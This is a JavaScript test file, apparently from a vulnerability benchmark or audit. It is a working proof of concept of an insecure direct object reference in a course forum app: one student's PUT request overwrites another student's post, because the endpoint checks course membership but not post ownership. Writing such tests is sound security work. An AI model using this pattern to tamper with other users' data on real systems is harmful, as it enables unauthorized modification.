const supertest = require('supertest');
const {
  startFreshServer,
  stopServer,
  openDb,
  registerAny,
  createCourseAny,
  listUsersAny,
  addMemberAny,
  createPostAny,
  getPostAny,
} = require('../../_helpers');

describe('PoC: IDOR - student edits another student post', () => {
  let server;

  beforeAll(async () => {
    server = await startFreshServer();
  }, 20000);

  afterAll(async () => {
    await stopServer(server);
  });

  test('bob can overwrite alice post because endpoint checks course membership but not ownership', async () => {
    const teacher = server.agent;
    const alice = supertest.agent(server.baseUrl);
    const bob = supertest.agent(server.baseUrl);

    const uniq = `${Date.now()}_${Math.random().toString(16).slice(2, 8)}`;
    const teacherName = `teacher_post_${uniq}`;
    const aliceName = `alice_post_${uniq}`;
    const bobName = `bob_post_${uniq}`;

    await registerAny(teacher, teacherName, 'pass123', 'Teacher Post');
    await registerAny(alice, aliceName, 'pass123', 'Alice');
    await registerAny(bob, bobName, 'pass123', 'Bob');

    const db = openDb();
    try {
      const courseRes = await createCourseAny(teacher, 'Course Post', 'Desc');
      const courseId =
        courseRes.body?.course?.course_id ||
        db.prepare('SELECT course_id FROM courses ORDER BY course_id DESC LIMIT 1').get().course_id;

      const usersRes = await listUsersAny(teacher);
      const users = usersRes.body?.users || db.prepare('SELECT * FROM users').all();

      const aliceUser = users.find((u) => u.username === aliceName);
      const bobUser = users.find((u) => u.username === bobName);

      expect(aliceUser).toBeTruthy();
      expect(bobUser).toBeTruthy();

      await addMemberAny(teacher, courseId, aliceUser.user_id, 'student');
      await addMemberAny(teacher, courseId, bobUser.user_id, 'student');

      const postRes = await createPostAny(alice, courseId, 'Alice title', 'Alice body');
      const postId =
        postRes.body?.post?.post_id ||
        db.prepare('SELECT post_id FROM posts ORDER BY post_id DESC LIMIT 1').get().post_id;

      const editRes = await bob
        .put(`/api/courses/${courseId}/posts/${postId}`)
        .send({ title: 'PWNED BY BOB', body: 'overwritten by bob' });

      expect([200, 302]).toContain(editRes.status);

      const fetchRes = await getPostAny(alice, courseId, postId);
      expect([200, 302]).toContain(fetchRes.status);

      const post =
        fetchRes.body?.post ||
        db.prepare('SELECT * FROM posts WHERE post_id=?').get(postId);

      expect(post.title).toBe('PWNED BY BOB');
      expect(post.body).toBe('overwritten by bob');
    } finally {
      db.close();
    }
  });
});